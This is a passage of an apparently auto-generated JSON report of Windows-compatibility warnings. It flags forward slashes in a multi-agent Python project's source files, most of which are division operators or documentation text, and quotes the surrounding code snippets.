        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1646: Forward slash in path - \"/resources\"",
        "timestamp": "2025-09-05T17:30:42.355242"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1656: Forward slash in path - \"/nonexistent\"",
        "timestamp": "2025-09-05T17:30:42.355278"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1669: Forward slash in path - \"/limited\"",
        "timestamp": "2025-09-05T17:30:42.355316"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1904: Forward slash in path - \"PUT /resource should return 200, not 201\"",
        "timestamp": "2025-09-05T17:30:42.355510"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 2062: Forward slash in path - '# API Documentation\n\n## Overview\nThis API provides endpoints for feature functionality.\n\n## Authentication\nAll endpoints require Bearer token authentication.\n\n## Endpoints\n\n### POST /api/process\nProcess data and return results.\n\n**Request:**\n```json\n{\n  \"",
        "timestamp": "2025-09-05T17:30:42.355620"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 2096: Forward slash in path - \"\n}\n```\n\n**Status Codes:**\n- 200: Success\n- 400: Bad Request\n- 401: Unauthorized\n- 500: Internal Server Error\n\n### GET /api/status\nGet system status.\n\n**Response:**\n```json\n{\n  \"",
        "timestamp": "2025-09-05T17:30:42.355666"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 2160: Forward slash in path - '# Technical Documentation\n\n## Architecture\n\n### Component Overview\n- **Core Engine**: Handles main processing logic\n- **API Layer**: RESTful API interface\n- **Data Layer**: Data persistence and caching\n- **Integration Layer**: External system integration\n\n### Design Patterns\n- **Factory Pattern**: For creating agent instances\n- **Observer Pattern**: For event handling\n- **Strategy Pattern**: For algorithm selection\n\n## Implementation Details\n\n### Core Algorithm\nThe system uses a multi-stage processing pipeline:\n1. Input validation\n2. Data transformation\n3. Core processing\n4. Result aggregation\n5. Output formatting\n\n### Performance Considerations\n- Async/await for I/O operations\n- Caching for frequently accessed data\n- Batch processing for bulk operations\n\n## Deployment\n\n### Requirements\n- Python 3.8+\n- 2GB RAM minimum\n- 10GB disk space\n\n### Configuration\nEnvironment variables:\n- `API_KEY`: Authentication key\n- `DATABASE_URL`: Database connection string\n- `CACHE_SIZE`: Cache size in MB\n\n## Monitoring\n- Health check endpoint: `/health`\n- Metrics endpoint: `/metrics`\n- Logging: JSON format to stdout\n'",
        "timestamp": "2025-09-05T17:30:42.355730"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 69: Forward slash in path - \"\n        return 1.0 / self.duration if self.duration > 0 else 0.0\n\n@dataclass\nclass CacheEntry:\n    \"",
        "timestamp": "2025-09-05T17:30:42.356374"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 149: Forward slash in path - '].items():\n            optimized = optimized.replace(full_term, abbrev)\n        \n        # Estimate token savings (rough approximation)\n        estimated_tokens_saved = (original_length - len(optimized)) // 4\n        \n        optimization_info = {\n            '",
        "timestamp": "2025-09-05T17:30:42.356417"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 159: Forward slash in path - ': len(optimized) / original_length if original_length > 0 else 1.0\n        }\n        \n        return optimized, optimization_info\n    \n    def create_context_window_manager(self, max_tokens: int = 4000):\n        \"",
        "timestamp": "2025-09-05T17:30:42.356429"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 183: Forward slash in path - \"\n        estimated_tokens = len(content) // 4  # Rough estimation\n        \n        segment = {\n            '",
        "timestamp": "2025-09-05T17:30:42.356445"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 292: Forward slash in path - \"\n        # First remove expired entries\n        self._evict_expired()\n        \n        if self.current_size_bytes + required_space <= self.max_size_bytes:\n            return\n        \n        # Calculate eviction scores (lower = evict first)\n        scored_entries = []\n        for key, entry in self.cache.items():\n            age_factor = (datetime.now() - entry.last_accessed).total_seconds()\n            frequency_factor = 1.0 / (entry.access_count + 1)\n            cost_factor = 1.0 / (entry.cost_saved + 1)\n            \n            score = age_factor * frequency_factor * cost_factor\n            scored_entries.append((score, key, entry))\n        \n        # Sort by score and evict lowest scoring entries\n        scored_entries.sort(key=lambda x: x[0])\n        space_freed = 0\n        \n        for score, key, entry in scored_entries:\n            if space_freed >= required_space:\n                break\n            self.cache.pop(key)\n            space_freed += entry.size_bytes or 0\n            self.current_size_bytes -= entry.size_bytes or 0\n            logger.debug(f\"",
        "timestamp": "2025-09-05T17:30:42.356522"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 382: Forward slash in path - \"\n        total_requests = self.hit_count + self.miss_count\n        hit_rate = self.hit_count / total_requests if total_requests > 0 else 0.0\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.356558"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 391: Forward slash in path - ': self.current_size_bytes / (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.356571"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 392: Forward slash in path - ': self.max_size_bytes / (1024 * 1024),\n            '",
        "timestamp": "2025-09-05T17:30:42.356582"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 474: Forward slash in path - ': len(batch_items) / process_time,\n                        '",
        "timestamp": "2025-09-05T17:30:42.356632"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 661: Forward slash in path - ': len(successful_metrics) / len(self.performance_metrics),\n            '",
        "timestamp": "2025-09-05T17:30:42.356740"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 686: Forward slash in path - ': 0.001})\n        \n        input_cost = (input_tokens / 1000) * model_pricing['",
        "timestamp": "2025-09-05T17:30:42.356773"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 688: Forward slash in path - ']\n        output_cost = (output_tokens / 1000) * model_pricing['",
        "timestamp": "2025-09-05T17:30:42.356790"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1053: Forward slash in path - ': 200 / cache_time,\n            '",
        "timestamp": "2025-09-05T17:30:42.357006"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1072: Forward slash in path - ': 20 / parallel_time,\n            '",
        "timestamp": "2025-09-05T17:30:42.357038"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1103: Forward slash in path - ': len(test_prompts) / token_time\n        }\n        \n        # Overall system performance\n        overall_start_time = min(\n            cache_start,\n            parallel_start,\n            token_start\n        )\n        overall_time = time.time() - overall_start_time\n        \n        benchmark_results['",
        "timestamp": "2025-09-05T17:30:42.357087"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1149: Forward slash in path - ': len(self.optimization_history) / max(len(self.optimization_history), 1)\n            }\n        }\n\nasync def demo_performance_optimization():\n    \"",
        "timestamp": "2025-09-05T17:30:42.357136"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1210: Forward slash in path - \"Speedup: {first_call_time / second_call_time:.1f}x\"",
        "timestamp": "2025-09-05T17:30:42.357191"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1240: Forward slash in path - ']:.1f} items/sec\"",
        "timestamp": "2025-09-05T17:30:42.357235"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1262: Forward slash in path - ']:.1f} ops/sec\"",
        "timestamp": "2025-09-05T17:30:42.357275"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1295: Forward slash in path - ']:.1f} ops/sec\"",
        "timestamp": "2025-09-05T17:30:42.357321"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1296: Forward slash in path - ']:.1f} tasks/sec\"",
        "timestamp": "2025-09-05T17:30:42.357351"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Line 1297: Forward slash in path - ']:.1f} prompts/sec\"",
        "timestamp": "2025-09-05T17:30:42.357382"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 349: Forward slash in path - ': sum(confidence_stats) / len(confidence_stats) if confidence_stats else 0,\n                '",
        "timestamp": "2025-09-05T17:30:42.357854"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 429: Forward slash in path - '])\n            consensus_ratio = positive_votes / total_participants\n            \n            if consensus_ratio >= self.consensus_threshold:\n                await self._complete_consensus(consensus_id, '",
        "timestamp": "2025-09-05T17:30:42.357912"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 447: Forward slash in path - '])\n        final_ratio = positive_votes / total_votes if total_votes > 0 else 0\n        \n        consensus['",
        "timestamp": "2025-09-05T17:30:42.357933"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 459: Forward slash in path - \"({positive_votes}/{total_votes} = {final_ratio:.2%})\"",
        "timestamp": "2025-09-05T17:30:42.357951"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 511: Forward slash in path - '] / len(consensus['",
        "timestamp": "2025-09-05T17:30:42.357991"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 518: Forward slash in path - ': sum(completion_times) / len(completion_times) if completion_times else 0,\n            '",
        "timestamp": "2025-09-05T17:30:42.358010"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 519: Forward slash in path - ': sum(participation_rates) / len(participation_rates) if participation_rates else 0,\n            '",
        "timestamp": "2025-09-05T17:30:42.358024"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 681: Forward slash in path - \"Resolve conflict based on agent/task priorities\"",
        "timestamp": "2025-09-05T17:30:42.358120"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 720: Forward slash in path - ']\n                allocation_per_agent = available / len(conflicting_agents)\n                \n                resolutions.append({\n                    '",
        "timestamp": "2025-09-05T17:30:42.358161"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Line 772: Forward slash in path - ': sum(resolution_times) / len(resolution_times) if resolution_times else 0,\n            '",
        "timestamp": "2025-09-05T17:30:42.358205"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Line 299: Forward slash in path - \"] for h in history) / len(history),\n                \"",
        "timestamp": "2025-09-05T17:30:42.358844"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Line 300: Forward slash in path - \"] for h in successful_retries) / len(successful_retries) if successful_retries else 0\n            }\n        else:\n            # Global stats\n            all_operations = sum(len(history) for history in self.retry_history.values())\n            if all_operations == 0:\n                return {\"",
        "timestamp": "2025-09-05T17:30:42.358860"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Line 321: Forward slash in path - \": successful_operations / all_operations,\n                \"",
        "timestamp": "2025-09-05T17:30:42.358878"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Line 322: Forward slash in path - \": total_attempts / all_operations,\n                \"",
        "timestamp": "2025-09-05T17:30:42.358889"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Line 407: Forward slash in path - \": len(successful_calls) / len(service_history),\n            \"",
        "timestamp": "2025-09-05T17:30:42.358944"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Line 408: Forward slash in path - \": len(fallback_calls) / len(service_history),\n            \"",
        "timestamp": "2025-09-05T17:30:42.358955"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Line 637: Forward slash in path - \":\n                circuit_breaker_issues += 1\n        \n        # Check recent failures\n        recent_failures = [\n            f for f in self.failure_records\n            if f.timestamp > datetime.now() - timedelta(minutes=10)\n        ]\n        \n        failure_rate = len(recent_failures) / 10.0  # failures per minute\n        \n        # Check degradation level\n        degradation_status = self.graceful_degradation.get_degradation_stats()\n        \n        health_status[\"",
        "timestamp": "2025-09-05T17:30:42.359086"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Line 723: Forward slash in path - \"\n        recovery_times = []\n        for failure in self.failure_records:\n            if failure.recovered_at:\n                recovery_time = (failure.recovered_at - failure.timestamp).total_seconds()\n                recovery_times.append(recovery_time)\n        \n        return sum(recovery_times) / len(recovery_times) if recovery_times else 0.0\n    \n    def _calculate_mtbf(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.359144"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Line 735: Forward slash in path - ')\n        \n        time_between_failures = []\n        for i in range(1, len(self.failure_records)):\n            time_diff = (self.failure_records[i].timestamp - self.failure_records[i-1].timestamp).total_seconds()\n            time_between_failures.append(time_diff)\n        \n        return sum(time_between_failures) / len(time_between_failures)\n\n\n# Example usage decorators and utilities\ndef resilient_api_call(circuit_breaker_name: str, max_retries: int = 3):\n    \"",
        "timestamp": "2025-09-05T17:30:42.359167"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\causal_inference.py",
        "warning": "Line 256: Forward slash in path - \"\n        try:\n            recommendations = []\n            \n            # Find causes of the target variable\n            causes = self.causal_graph.get_causes(target_var)\n            \n            for cause_rel in causes:\n                cause_var = cause_rel.cause_variable\n                \n                # Get current average value of cause\n                if cause_var not in self.data_store:\n                    continue\n                \n                recent_cause_values = [val for _, val in self.data_store[cause_var][-10:]]\n                if not recent_cause_values:\n                    continue\n                \n                current_cause_avg = np.mean(recent_cause_values)\n                \n                # Calculate required change in cause to achieve target\n                # This is a simplified linear model\n                recent_effect_values = [val for _, val in self.data_store[target_var][-10:]]\n                if not recent_effect_values:\n                    continue\n                \n                current_effect_avg = np.mean(recent_effect_values)\n                effect_change_needed = target_value - current_effect_avg\n                \n                # Scale by relationship strength\n                cause_change_needed = effect_change_needed / max(cause_rel.strength, 0.1)\n                recommended_cause_value = current_cause_avg + cause_change_needed\n                \n                recommendations.append({\n                    '",
        "timestamp": "2025-09-05T17:30:42.359904"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\predictive_coordinator.py",
        "warning": "Line 154: Forward slash in path - \"\n                            confidence = 0.6\n                    \n                    # Adjust based on task complexity (simple heuristic)\n                    task_complexity = len(task.split()) / 10.0  # Simple complexity measure\n                    confidence *= max(0.5, 1.0 - task_complexity)\n                    \n                    prediction = AgentPrediction(\n                        agent_id=agent_name,\n                        predicted_state=predicted_state,\n                        confidence=confidence,\n                        time_horizon=timedelta(minutes=30),  # Default horizon\n                        factors=[\"",
        "timestamp": "2025-09-05T17:30:42.360631"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\predictive_coordinator.py",
        "warning": "Line 179: Forward slash in path - \"\n        try:\n            allocation = {agent_name: [] for agent_name in self.agents.keys()}\n            \n            if not predictions:\n                # Fallback: distribute tasks evenly\n                for i, task in enumerate(tasks):\n                    agent_names = list(self.agents.keys())\n                    if agent_names:\n                        chosen_agent = agent_names[i % len(agent_names)]\n                        allocation[chosen_agent].append(task)\n                return allocation\n            \n            # Group predictions by agent\n            agent_predictions = {}\n            for pred in predictions:\n                if pred.agent_id not in agent_predictions:\n                    agent_predictions[pred.agent_id] = []\n                agent_predictions[pred.agent_id].append(pred)\n            \n            # Greedy allocation: assign each task to best predicted agent\n            for task in tasks:\n                best_agent = None\n                best_score = -1.0\n                \n                for agent_name in self.agents.keys():\n                    if agent_name in agent_predictions:\n                        # Find prediction for this agent/task combination\n                        relevant_predictions = agent_predictions[agent_name]\n                        if relevant_predictions:\n                            avg_confidence = np.mean([p.confidence for p in relevant_predictions])\n                            # Prefer agents with fewer current assignments (load balancing)\n                            load_factor = 1.0 / (len(allocation[agent_name]) + 1)\n                            score = avg_confidence * load_factor\n                            \n                            if score > best_score:\n                                best_score = score\n                                best_agent = agent_name\n                \n                if best_agent:\n                    allocation[best_agent].append(task)\n                else:\n                    # Fallback to first available agent\n                    if allocation:\n                        first_agent = list(allocation.keys())[0]\n                        allocation[first_agent].append(task)\n            \n            return allocation\n            \n        except Exception as e:\n            logger.error(f\"",
        "timestamp": "2025-09-05T17:30:42.360757"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\predictive_coordinator.py",
        "warning": "Line 253: Forward slash in path - \"\n        try:\n            max_time = timedelta(0)\n            \n            for agent_name, tasks in assignments.items():\n                if not tasks:\n                    continue\n                \n                # Estimate time based on task complexity and agent history\n                estimated_time_per_task = timedelta(minutes=10)  # Default estimate\n                \n                # Adjust based on historical performance\n                if agent_name in self.agent_performance_history:\n                    history = self.agent_performance_history[agent_name]\n                    if history:\n                        avg_performance = np.mean([perf for _, perf in history[-5:]])\n                        # Higher performance = faster completion\n                        time_factor = 1.0 / max(avg_performance, 0.1)\n                        estimated_time_per_task = timedelta(minutes=10 * time_factor)\n                \n                agent_total_time = estimated_time_per_task * len(tasks)\n                max_time = max(max_time, agent_total_time)\n            \n            return max_time\n            \n        except Exception as e:\n            logger.error(f\"",
        "timestamp": "2025-09-05T17:30:42.360823"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\predictive_coordinator.py",
        "warning": "Line 359: Forward slash in path - \"] / plan_summary[\"",
        "timestamp": "2025-09-05T17:30:42.360928"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_agent.py",
        "warning": "Line 159: Forward slash in path - ': sum(confidences) / len(confidences),\n                '",
        "timestamp": "2025-09-05T17:30:42.361729"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_agent.py",
        "warning": "Line 334: Forward slash in path - ', 0)\n        \n        health_score = min(1.0, (total_events / 1000) * 0.5 + (active_patterns / 10) * 0.3 + (cache_size / 100) * 0.2)\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.361940"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_agent.py",
        "warning": "Line 409: Forward slash in path - ': sum(confidences) / len(confidences),\n                '",
        "timestamp": "2025-09-05T17:30:42.362040"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_agent.py",
        "warning": "Line 416: Forward slash in path - \"\n        # Simplified resource efficiency calculation\n        active_opts = len(self.active_optimizations)\n        temporal_objs = len(self.temporal_objectives)\n        \n        # Calculate efficiency based on active optimizations vs objectives\n        efficiency = (active_opts / max(temporal_objs, 1)) if temporal_objs > 0 else 1.0\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.362071"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 330: Forward slash in path - \"\n        if len(events) < 5:\n            return\n        \n        # Extract numerical features for trend analysis\n        timestamps = [e.timestamp for e in events[-10:]]\n        \n        # Simple trend detection on event frequency\n        time_diffs = [(timestamps[i+1] - timestamps[i]).total_seconds() \n                     for i in range(len(timestamps)-1)]\n        \n        if len(time_diffs) >= 3:\n            # Check for accelerating/decelerating trends\n            if all(time_diffs[i] < time_diffs[i+1] for i in range(len(time_diffs)-1)):\n                # Decelerating trend (events getting more frequent)\n                pattern_id = f\"",
        "timestamp": "2025-09-05T17:30:42.363071"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 434: Forward slash in path - \"Processor for microsecond/millisecond events\"",
        "timestamp": "2025-09-05T17:30:42.363199"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 463: Forward slash in path - \"\n        if len(events) < 2:\n            return None\n        \n        intervals = []\n        for i in range(len(events) - 1):\n            interval = events[i + 1].timestamp - events[i].timestamp\n            intervals.append(interval)\n        \n        if intervals:\n            avg_seconds = sum(i.total_seconds() for i in intervals) / len(intervals)\n            return timedelta(seconds=avg_seconds)\n        \n        return None\n    \n    async def optimize(self, objective: str, current_state: Dict, constraints: Dict, cross_horizon_context: Dict) -> Any:\n        \"",
        "timestamp": "2025-09-05T17:30:42.363264"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 494: Forward slash in path - \"Processor for second/minute events\"",
        "timestamp": "2025-09-05T17:30:42.363301"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 497: Forward slash in path - \"\n        predictions = []\n        \n        # Short-term predictions based on recent trends\n        if len(events) >= 3:\n            # Analyze recent trend\n            recent_events = events[-5:]\n            event_counts = {}\n            \n            for event in recent_events:\n                event_counts[event.event_type] = event_counts.get(event.event_type, 0) + 1\n            \n            # Predict most common event types\n            for event_type, count in event_counts.items():\n                if count >= 2:  # Appeared at least twice\n                    confidence = min(0.9, count / len(recent_events))\n                    \n                    if confidence >= threshold:\n                        predictions.append(TemporalEvent(\n                            timestamp=datetime.now() + window / 2,\n                            event_type=event_type,\n                            data={'",
        "timestamp": "2025-09-05T17:30:42.363342"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 543: Forward slash in path - \"Processor for hour/day events\"",
        "timestamp": "2025-09-05T17:30:42.363390"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 546: Forward slash in path - \"\n        predictions = []\n        \n        # Medium-term predictions based on patterns\n        if len(events) >= 10:\n            # Look for daily/hourly patterns\n            hourly_patterns = self._analyze_hourly_patterns(events)\n            \n            for hour, pattern_events in hourly_patterns.items():\n                if len(pattern_events) >= 2:\n                    avg_event = self._create_average_event(pattern_events)\n                    \n                    # Predict for next occurrence of this hour\n                    next_occurrence = self._next_hour_occurrence(hour)\n                    \n                    if next_occurrence <= datetime.now() + window:\n                        predictions.append(TemporalEvent(\n                            timestamp=next_occurrence,\n                            event_type=avg_event.event_type,\n                            data={'",
        "timestamp": "2025-09-05T17:30:42.363443"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 584: Forward slash in path - \"\n        # Simplified averaging - take the most common event type\n        event_types = [e.event_type for e in events]\n        most_common = max(set(event_types), key=event_types.count)\n        \n        avg_confidence = sum(e.confidence for e in events) / len(events)\n        \n        return TemporalEvent(\n            timestamp=events[-1].timestamp,\n            event_type=most_common,\n            data={'",
        "timestamp": "2025-09-05T17:30:42.363493"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 626: Forward slash in path - \"Processor for week/month events\"",
        "timestamp": "2025-09-05T17:30:42.363554"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\temporal_engine.py",
        "warning": "Line 684: Forward slash in path - 's an increasing or decreasing trend\n        increases = sum(1 for i in range(len(event_counts)-1) \n                       if event_counts[i+1] > event_counts[i])\n        \n        trend_strength = increases / (len(event_counts) - 1) if len(event_counts) > 1 else 0.5\n        \n        return trend_strength\n    \n    async def optimize(self, objective: str, current_state: Dict, constraints: Dict, cross_horizon_context: Dict) -> Any:\n        \"",
        "timestamp": "2025-09-05T17:30:42.363643"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\temporal\\time_series_processor.py",
